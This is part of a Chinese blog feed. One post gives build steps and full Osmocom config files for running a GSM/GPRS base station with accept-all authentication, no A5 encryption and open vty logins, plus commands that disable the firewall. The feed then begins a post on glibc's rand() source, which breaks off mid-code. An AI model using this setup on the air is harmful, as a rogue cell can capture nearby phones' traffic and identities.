$osmo_src</span><br><span class="line">git clone git://git.osmocom.org/osmo-sgsn</span><br><span class="line">cd osmo-sgsn</span><br><span class="line">autoreconf -fi</span><br><span class="line">./configure --enable-iu</span><br><span class="line">make -j5</span><br><span class="line">make check</span><br><span class="line">make install</span><br><span class="line">sudo ldconfig</span><br></pre></td></tr></table></figure><h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h4><p>openbsc.cfg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line">!</span><br><span class="line">! OpenBSC (1.0.0.14-98a2ba) configuration saved from vty</span><br><span class="line">!!</span><br><span class="line">password foo</span><br><span class="line">!</span><br><span class="line">log stderr</span><br><span class="line">  logging filter all 1</span><br><span class="line">  logging color 1</span><br><span class="line">  logging print category 0</span><br><span class="line">  logging timestamp 0</span><br><span class="line">  logging print file 1</span><br><span class="line">  logging level all everything</span><br><span class="line">  logging level rll notice</span><br><span class="line">  logging level cc notice</span><br><span class="line">  logging level mm notice</span><br><span class="line">  logging level rr notice</span><br><span class="line">  logging level rsl notice</span><br><span class="line">  logging level nm info</span><br><span class="line">  logging level mncc notice</span><br><span class="line">  logging level pag notice</span><br><span class="line">  logging level meas notice</span><br><span class="line">  logging level sccp notice</span><br><span class="line">  logging level msc notice</span><br><span class="line">  logging level mgcp notice</span><br><span class="line">  logging level ho notice</span><br><span class="line">  logging level db notice</span><br><span class="line">  logging level ref notice</span><br><span class="line">  logging level gprs debug</span><br><span class="line">  logging level ns info</span><br><span class="line">  logging level bssgp debug</span><br><span class="line">  logging level llc debug</span><br><span class="line">  logging level sndcp debug</span><br><span class="line">  logging level nat notice</span><br><span class="line">  logging level ctrl notice</span><br><span class="line">  logging level smpp debug</span><br><span class="line">  logging level filter debug</span><br><span class="line">  logging level ranap debug</span><br><span class="line">  logging level sua debug</span><br><span class="line">  logging level pcu debug</span><br><span class="line">  logging level lglobal notice</span><br><span class="line">  logging level llapd notice</span><br><span class="line">  logging level linp notice</span><br><span class="line">  logging level lmux notice</span><br><span class="line">  logging level lmi notice</span><br><span class="line">  logging level lmib notice</span><br><span class="line">  logging level lsms notice</span><br><span class="line">  logging level lctrl notice</span><br><span class="line">  logging level lgtp notice</span><br><span class="line">  logging level lstats notice</span><br><span class="line">  logging level lgsup notice</span><br><span class="line">  logging level loap notice</span><br><span class="line">  logging level lss7 notice</span><br><span class="line">  logging level lsccp notice</span><br><span class="line">  logging level lsua notice</span><br><span class="line">  logging level lm3ua notice</span><br><span class="line">  logging level lmgcp notice</span><br><span class="line">!</span><br><span class="line">stats interval 5</span><br><span class="line">!</span><br><span class="line">line vty</span><br><span class="line"> no login</span><br><span class="line">!</span><br><span class="line">e1_input</span><br><span class="line"> e1_line 0 driver ipa</span><br><span class="line"> e1_line 0 port 0</span><br><span class="line"> no e1_line 0 keepalive</span><br><span class="line">network</span><br><span class="line"> network country code 460</span><br><span class="line"> mobile network code 10</span><br><span class="line"> short name OpenBSC</span><br><span class="line"> long name OpenBSC</span><br><span class="line"> auth policy accept-all</span><br><span class="line"> authorized-regexp .*</span><br><span class="line"> location updating reject cause 13</span><br><span class="line"> encryption a5 0</span><br><span class="line"> neci 1</span><br><span class="line"> paging any use tch 0</span><br><span class="line"> rrlp mode none</span><br><span class="line"> mm info 1</span><br><span class="line"> handover 0</span><br><span class="line"> handover window rxlev averaging 10</span><br><span class="line"> handover window rxqual averaging 1</span><br><span class="line"> handover window rxlev neighbor averaging 10</span><br><span class="line"> handover power budget interval 6</span><br><span class="line"> handover power budget hysteresis 3</span><br><span class="line"> handover maximum distance 9999</span><br><span class="line"> dyn_ts_allow_tch_f 0</span><br><span class="line"> subscriber-keep-in-ram 0</span><br><span class="line"> bts 0</span><br><span class="line">  type sysmobts</span><br><span class="line">  band GSM900</span><br><span class="line">  cell_identity 0</span><br><span class="line">  location_area_code 1</span><br><span class="line">  base_station_id_code 63</span><br><span class="line">  ms max power 35</span><br><span class="line">  cell reselection hysteresis 4</span><br><span class="line">  rxlev access min 0</span><br><span class="line">  periodic location update 30</span><br><span class="line">  radio-link-timeout 32</span><br><span class="line">  channel allocator ascending</span><br><span class="line">  rach tx integer 9</span><br><span class="line">  rach max transmission 7</span><br><span class="line">  channel-descrption attach 1</span><br><span class="line">  channel-descrption bs-pa-mfrms 5</span><br><span class="line">  channel-descrption bs-ag-blks-res 1</span><br><span class="line">  early-classmark-sending forbidden</span><br><span class="line">  early-classmark-sending-3g allowed</span><br><span class="line">  ip.access unit_id 1801 0</span><br><span class="line">  oml ip.access stream_id 255 line 0</span><br><span class="line">  neighbor-list mode automatic</span><br><span class="line">  codec-support fr efr amr</span><br><span class="line">  amr tch-f modes 2</span><br><span class="line">  amr tch-f start-mode 1</span><br><span class="line">  gprs mode gprs</span><br><span class="line">  gprs routing area 1</span><br><span class="line">  gprs cell bvci 1234</span><br><span class="line">  gprs nsei 1234</span><br><span class="line">  gprs nsvc 0 nsvci 1234</span><br><span class="line">  gprs nsvc 0 local udp port 23001</span><br><span class="line">  gprs nsvc 0 remote udp port 23000</span><br><span class="line">  gprs nsvc 0 remote ip 127.0.0.1</span><br><span class="line">  no force-combined-si</span><br><span class="line">  trx 0</span><br><span class="line">   rf_locked 0</span><br><span class="line">   arfcn 975</span><br><span class="line">   nominal power 13</span><br><span class="line">   max_power_red 0</span><br><span class="line">   rsl e1 tei 0</span><br><span class="line">   timeslot 0</span><br><span class="line">    phys_chan_config CCCH+SDCCH4</span><br><span class="line">    hopping enabled 0</span><br><span class="line">   timeslot 1</span><br><span class="line">    phys_chan_config SDCCH8</span><br><span class="line">    hopping enabled 0</span><br><span class="line">   timeslot 2</span><br><span class="line">    phys_chan_config TCH/F</span><br><span class="line">    hopping enabled 0</span><br><span class="line">   timeslot 3</span><br><span class="line">    phys_chan_config TCH/F</span><br><span class="line">    hopping enabled 0</span><br><span class="line">   timeslot 4</span><br><span class="line">    phys_chan_config PDCH</span><br><span class="line">    hopping enabled 0</span><br><span class="line">   timeslot 5</span><br><span class="line">    phys_chan_config PDCH</span><br><span class="line">    hopping enabled 0</span><br><span class="line">   timeslot 6</span><br><span class="line">    phys_chan_config PDCH</span><br><span class="line">    hopping enabled 0</span><br><span class="line">   timeslot 7</span><br><span class="line">    phys_chan_config PDCH</span><br><span class="line">    hopping enabled 0</span><br><span class="line">mncc-int</span><br><span class="line"> default-codec tch-f fr</span><br><span class="line"> default-codec tch-h hr</span><br><span class="line">nitb</span><br><span class="line"> subscriber-create-on-demand</span><br><span class="line"> assign-tmsi</span><br></pre></td></tr></table></figure></p><p>osmo-bts.cfg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">!</span><br><span class="line">! OsmoBTS () configuration saved from vty</span><br><span class="line">!!</span><br><span class="line">!</span><br><span class="line">log stderr</span><br><span class="line">  logging color 1</span><br><span class="line">  logging timestamp 0</span><br><span class="line">  logging level rsl notice</span><br><span class="line">  logging level oml notice</span><br><span class="line">  logging level rll notice</span><br><span class="line">  logging level rr notice</span><br><span class="line">  logging level meas error</span><br><span class="line">  logging level pag error</span><br><span class="line">  logging level l1c error</span><br><span class="line">  logging level l1p error</span><br><span class="line">  logging level dsp error</span><br><span class="line">  logging level abis error</span><br><span class="line">!</span><br><span class="line">line vty</span><br><span class="line"> no login</span><br><span class="line">!</span><br><span class="line">phy 0</span><br><span class="line"> instance 0</span><br><span class="line">  osmotrx rx-gain 43</span><br><span class="line"> osmotrx ip local 127.0.0.1</span><br><span class="line"> osmotrx ip remote 127.0.0.1</span><br><span class="line">bts 0</span><br><span class="line"> band 900</span><br><span class="line"> ipa unit-id 1801 0</span><br><span class="line"> oml remote-ip 127.0.0.1</span><br><span class="line"> gsmtap-sapi ccch</span><br><span class="line"> gsmtap-sapi pdtch</span><br><span class="line"> trx 0</span><br><span class="line">  phy 0 instance 0</span><br></pre></td></tr></table></figure></p><p>osmo-ggsn.cfg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">!</span><br><span class="line">! OpenGGSN (0.94.1-adac) configuration saved from vty</span><br><span class="line">!!</span><br><span class="line">!</span><br><span class="line">log stderr</span><br><span class="line">  logging filter all 1</span><br><span class="line">  logging color 1</span><br><span class="line">  logging print category 0</span><br><span class="line">  logging timestamp 0</span><br><span class="line">  logging level ip info</span><br><span class="line">  logging level tun info</span><br><span class="line">  logging level ggsn info</span><br><span class="line">  logging level sgsn notice</span><br><span class="line">  logging level icmp6 notice</span><br><span class="line">  logging level lglobal notice</span><br><span class="line">  logging level llapd notice</span><br><span class="line">  logging level linp notice</span><br><span class="line">  logging level lmux notice</span><br><span class="line">  logging level lmi notice</span><br><span class="line">  logging level lmib notice</span><br><span class="line">  logging level lsms notice</span><br><span class="line">  logging level lctrl notice</span><br><span class="line">  logging level lgtp info</span><br><span class="line">  logging level lstats notice</span><br><span class="line">  logging level lgsup notice</span><br><span class="line">  logging level loap notice</span><br><span class="line">  logging level lss7 notice</span><br><span class="line">  logging level lsccp notice</span><br><span class="line">  logging level lsua notice</span><br><span class="line">  logging level lm3ua notice</span><br><span class="line">  logging level lmgcp notice</span><br><span class="line">!</span><br><span class="line">stats interval 5</span><br><span class="line">!</span><br><span class="line">line vty</span><br><span class="line"> no login</span><br><span class="line">!</span><br><span class="line">ggsn ggsn0</span><br><span class="line"> gtp state-dir /tmp</span><br><span class="line"> gtp bind-ip 127.0.0.6</span><br><span class="line"> apn internet</span><br><span class="line">  gtpu-mode tun</span><br><span class="line">  tun-device tun4</span><br><span class="line">  type-support v4</span><br><span class="line">  ip prefix dynamic 176.16.222.0/24</span><br><span class="line">!  ip prefix dynamic 192.168.7.0/24</span><br><span class="line">  ip dns 0 114.114.114.114</span><br><span class="line">  ip dns 1 8.8.8.8</span><br><span class="line">  ip ifconfig 176.16.222.0/24</span><br><span class="line">!  ip ifconfig 192.168.7.0/24</span><br><span class="line">  no shutdown</span><br><span class="line"> apn inet6</span><br><span class="line">  gtpu-mode tun</span><br><span class="line">  tun-device tun6</span><br><span class="line">  type-support v6</span><br><span class="line">  ipv6 prefix dynamic 2001:780:44:2000:0:0:0:0/56</span><br><span class="line">  ipv6 dns 0 2001:4860:4860::8888</span><br><span class="line">  ipv6 dns 1 2001:4860:4860::8844</span><br><span class="line">  ipv6 ifconfig 2001:780:44:2000:0:0:0:0/56</span><br><span class="line">  no shutdown</span><br><span class="line"> apn inet46</span><br><span class="line">  gtpu-mode tun</span><br><span class="line">  tun-device tun46</span><br><span class="line">  type-support v4v6</span><br><span class="line">  ip prefix dynamic 176.16.46.0/24</span><br><span class="line">  ip dns 0 114.114.114.114</span><br><span class="line">  ip dns 1 8.8.8.8</span><br><span class="line">  ip ifconfig 176.16.46.0/24</span><br><span class="line">  ipv6 prefix dynamic 2001:780:44:2100:0:0:0:0/56</span><br><span class="line">  ipv6 dns 0 2001:4860:4860::8888</span><br><span class="line">  ipv6 dns 1 2001:4860:4860::8844</span><br><span class="line">  ipv6 ifconfig 2001:780:44:2100:0:0:0:0/56</span><br><span class="line">  no shutdown</span><br><span class="line"> default-apn internet</span><br><span class="line"> no shutdown ggsn</span><br></pre></td></tr></table></figure></p><p>osmo-pcu.cfg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">!</span><br><span class="line">! Osmo-PCU (0.4.0.83-5b22) configuration saved from vty</span><br><span class="line">!!</span><br><span class="line">!</span><br><span class="line">log stderr</span><br><span class="line">  logging filter all 1</span><br><span class="line">  logging color 1</span><br><span class="line">  logging print category 0</span><br><span class="line">  logging timestamp 0</span><br><span class="line">  logging print file 1</span><br><span class="line">  logging level all everything</span><br><span class="line">  logging level csn1 info</span><br><span class="line">  logging level l1if info</span><br><span class="line">  logging level rlcmac notice</span><br><span class="line">  logging level rlcmacdata notice</span><br><span class="line">  logging level rlcmacdl notice</span><br><span class="line">  logging level rlcmacul notice</span><br><span class="line">  logging level rlcmacsched notice</span><br><span class="line">  logging level rlcmacmeas info</span><br><span class="line">  logging level tbf info</span><br><span class="line">  logging level tbfdl info</span><br><span class="line">  logging level tbful info</span><br><span class="line">  logging level ns info</span><br><span class="line">  logging level bssgp info</span><br><span class="line">  logging level pcu notice</span><br><span class="line">  logging level lglobal notice</span><br><span class="line">  logging level llapd notice</span><br><span class="line">  logging level linp notice</span><br><span class="line">  logging level lmux notice</span><br><span class="line">  logging level lmi notice</span><br><span class="line">  logging level lmib notice</span><br><span class="line">  logging level lsms notice</span><br><span class="line">  logging level lctrl notice</span><br><span class="line">  logging level lgtp notice</span><br><span class="line">  logging level lstats notice</span><br><span class="line">  logging level lgsup notice</span><br><span class="line">  logging level loap notice</span><br><span class="line">  logging level lss7 notice</span><br><span class="line">  logging level lsccp notice</span><br><span class="line">  logging level lsua notice</span><br><span class="line">  logging level lm3ua notice</span><br><span class="line">  logging level lmgcp notice</span><br><span class="line">!</span><br><span class="line">stats interval 5</span><br><span class="line">!</span><br><span class="line">line vty</span><br><span class="line"> no login</span><br><span class="line">!</span><br><span class="line">pcu</span><br><span class="line"> flow-control-interval 10</span><br><span class="line"> cs 2</span><br><span class="line"> cs max 4</span><br><span class="line"> cs threshold 10 33</span><br><span class="line"> cs downgrade-threshold 200</span><br><span class="line"> cs link-quality-ranges cs1 6 cs2 5 8 cs3 7 13 cs4 12</span><br><span class="line"> mcs link-quality-ranges mcs1 6 mcs2 5 8 mcs3 7 13 mcs4 12 15 mcs5 14 17 mcs6 16 18 mcs7 17 20 mcs8 19 24 mcs9 23</span><br><span class="line"> mcs max 9</span><br><span class="line"> window-size 64 0</span><br><span class="line"> queue idle-ack-delay 10</span><br><span class="line"> queue codel</span><br><span class="line"> alloc-algorithm dynamic</span><br><span class="line"> alpha 0</span><br><span class="line"> gamma 0</span><br><span class="line"> dl-tbf-idle-time 2000</span><br></pre></td></tr></table></figure></p><p>osmo-sgsn.cfg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">!</span><br><span class="line">! Osmocom SGSN configuration</span><br><span class="line">!</span><br><span class="line">!</span><br><span class="line">line vty</span><br><span class="line"> no login</span><br><span class="line">!</span><br><span class="line">sgsn</span><br><span class="line"> gtp local-ip 127.0.0.1</span><br><span class="line"> ggsn 0 remote-ip 127.0.0.6</span><br><span class="line"> ggsn 0 gtp-version 1</span><br><span class="line">! auth-policy closed</span><br><span class="line">! accept-all, closed, acl-only, remote</span><br><span class="line"> auth-policy accept-all</span><br><span class="line">! gsup remote-ip 127.0.0.1</span><br><span class="line">! gsup remote-port 4222</span><br><span class="line">!</span><br><span class="line">ns</span><br><span class="line"> timer tns-block 3</span><br><span class="line"> timer tns-block-retries 3</span><br><span class="line"> timer tns-reset 3</span><br><span class="line"> timer tns-reset-retries 3</span><br><span class="line"> timer tns-test 30</span><br><span class="line"> timer tns-alive 3</span><br><span class="line"> timer tns-alive-retries 10</span><br><span class="line"> encapsulation udp local-ip 127.0.0.1</span><br><span class="line"> encapsulation udp local-port 23000</span><br><span class="line"> encapsulation framerelay-gre enabled 0</span><br><span class="line">!</span><br><span class="line">bssgp</span><br><span class="line">!</span><br></pre></td></tr></table></figure></p><p>osmo-trx.cfg<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">log stderr</span><br><span class="line">  logging filter all 1</span><br><span class="line">  logging color 1</span><br><span class="line">  logging print category 1</span><br><span class="line">  logging timestamp 1</span><br><span class="line">  logging level all info</span><br><span class="line">!</span><br><span class="line">line vty</span><br><span class="line"> no login</span><br><span class="line">!</span><br><span class="line">trx</span><br><span class="line"> bind-ip 127.0.0.1</span><br><span class="line"> remote-ip 127.0.0.1</span><br><span class="line"> base-port 5700</span><br><span class="line"> egprs disable</span><br><span class="line"> tx-sps 4</span><br><span class="line"> rx-sps 4</span><br><span class="line"> chan 0</span><br><span class="line">  tx-path BAND1</span><br><span class="line">  rx-path LNAW</span><br></pre></td></tr></table></figure></p><h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw disable</span><br><span class="line">sudo iptables -F</span><br><span class="line">sudo iptables -t nat -F</span><br><span class="line">iptables -A POSTROUTING -t nat -o ens33 -j MASQUERADE &lt;-- change to your nic interface</span><br><span class="line">sudo -s</span><br><span class="line">echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>开多个终端跑起来<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo osmo-trx -b4 -s4</span><br><span class="line">sudo osmo-nitb -m -P</span><br><span class="line">sudo osmo-pcu</span><br><span class="line">sudo osmo-sgsn</span><br><span class="line">sudo osmo-ggsn</span><br><span class="line">sudo osmo-bts-trx</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>探究rand()函数生成的伪随机数</title>
      <link href="/2018/07/12/%E6%8E%A2%E7%A9%B6rand/"/>
      <url>/2018/07/12/%E6%8E%A2%E7%A9%B6rand/</url>
      
        <content type="html"><![CDATA[<p>今天碰到了一个关于rand()伪随机数的问题，很有意思，记录一下。</p><h2 id="伪随机性"><a href="#伪随机性" class="headerlink" title="伪随机性"></a>伪随机性</h2><p>摘自Wikipedia:<br>伪随机性（英语：Pseudorandomness）是一个过程似乎是随机的，但实际上并不是。例如伪随机数是使用一个确定性的算法计算出来的似乎是随机的数序，因此伪随机数实际上并不随机。在计算伪随机数时假如使用的开始值不变的话，那么伪随机数的数序也不变。伪随机数的随机性可以用它的统计特性来衡量，其主要特征是每个数出现的可能性和它出现时与数序中其它数的关系。伪随机数的优点是它的计算比较简单，而且只使用少数数值很难推算出计算它的算法。一般人们使用一个假的随机数，比如电脑上的时间作为计算伪随机数的开始值。</p><h2 id="rand-函数"><a href="#rand-函数" class="headerlink" title="rand()函数"></a>rand()函数</h2><p>我想知道rand()的实现方式，尝试调试了一下，比较复杂。找到了glibc的源码，地址：<code>http://ftp.gnu.org/gnu/glibc/</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">__random_r (struct random_data *buf, <span class="keyword">int32_t</span> *result)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int32_t</span> *state;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (buf == <span class="literal">NULL</span> || result == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br><span class="line"></span><br><span class="line">  state = buf-&gt;state;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (buf-&gt;rand_type == TYPE_0)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int32_t</span> val = state[<span class="number">0</span>];</span><br><span class="line">      val = ((state[<span class="number">0</span>] * <span class="number">1103515245</span>) + <span class="number">12345</span>) &amp; <span class="number">0x7fffffff</span>;</span><br><span class="line">      state[<span class="number">0</span>] = val;</span><br><span class="line">      *result = val;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int32_t</span> *fptr = buf-&gt;fptr;</span><br><span class="line">      <span class="keyword">int32_t</span> *rptr = buf-&gt;rptr;</span><br><span class="line">      <span class="keyword">int32_t</span> *end_ptr = buf-&gt;end_ptr;</span><br><span class="line">      <span class="keyword">int32_t</span> val;</span><br><span class="line"></span><br><span class="line">      val = *fptr += *rptr;</span><br><span class="line">      <span class="comment">/* Chucking least random bit.  */</span></span><br><span class="line">      *result = (val &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x7fffffff</span>;</span><br><span class="line">      ++fptr;</span><br><span class="line">      <span class="keyword">if</span> (fptr &gt;= end_ptr)</span><br><span class="line">&#123;</span><br><span class="line">  fptr = state;</span><br><span class="line">  ++rptr;</span><br><span 